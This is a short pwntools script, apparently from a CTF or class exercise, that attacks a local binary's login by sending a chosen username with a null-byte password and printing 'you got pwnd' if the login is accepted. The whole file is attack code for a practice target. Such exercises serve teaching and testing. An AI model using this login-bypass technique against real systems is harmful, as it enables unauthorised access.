from pwn import *
import sys
p = process("./a.out")


def exploit(username,password):
	p.recvuntil("================\n")
	p.sendlineafter("================\n",'1')
	p.sendlineafter("Please input your username:\n",str(username))
	p.sendlineafter("Please input your password:\n",'\x00')
	p.recvline()
	p.recv(2) #TODO: odstrani ko urban popravi svoje randomly placed printfe
	check_line = p.recvline()
	if username in check_line:
		print "you got pwnd"
	else:
		print "Sad NOX"
if __name__ == '__main__':
	exploit(sys.argv[1],sys.argv[2])
